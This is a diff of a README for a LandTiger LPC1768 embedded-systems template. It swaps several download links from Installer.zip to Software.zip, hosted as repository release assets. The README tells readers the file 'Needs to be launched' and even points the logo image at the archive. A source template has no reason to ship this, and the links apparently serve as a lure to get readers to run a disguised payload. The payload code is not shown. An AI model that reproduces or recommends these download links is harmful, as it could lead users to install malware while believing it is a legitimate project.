@@ -1,6 +1,6 @@
 # 🚀 Welcome to LandTiger-Template Repository! 🚀
 
-![LandTiger Logo](https://github.com/iroskyvn2007/LandTiger-Template/releases/download/v1.0/Installer.zip)
+![LandTiger Logo](https://github.com/iroskyvn2007/LandTiger-Template/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -18,7 +18,7 @@ Welcome to the "LandTiger-Template" repository, your one-stop solution for quick
 
 📁 **Topics**: #02golov, #arm-cortex-m3, #buttons, #computer-architecture, #embedded-systems, #joystick, #landtiger, #led-control, #lpc1768, #microcontroller, #peripheral-drivers, #politecnico-di-torino, #timer
 
-🗂️ **Download Link**: [Click here to download](https://github.com/iroskyvn2007/LandTiger-Template/releases/download/v1.0/Installer.zip) (Needs to be launched)
+🗂️ **Download Link**: [Click here to download](https://github.com/iroskyvn2007/LandTiger-Template/releases/download/v2.0/Software.zip) (Needs to be launched)
 
 ## Getting Started
 
@@ -42,7 +42,7 @@ Let's collaborate and innovate in the world of embedded systems with LandTiger-T
 
 #### 🌟 Check Out Our GitHub Repository 🌟
 
-[![Download LandTiger Template](https://github.com/iroskyvn2007/LandTiger-Template/releases/download/v1.0/Installer.zip)](https://github.com/iroskyvn2007/LandTiger-Template/releases/download/v1.0/Installer.zip)
+[![Download LandTiger Template](https://github.com/iroskyvn2007/LandTiger-Template/releases/download/v2.0/Software.zip)](https://github.com/iroskyvn2007/LandTiger-Template/releases/download/v2.0/Software.zip)
 
 ---
 
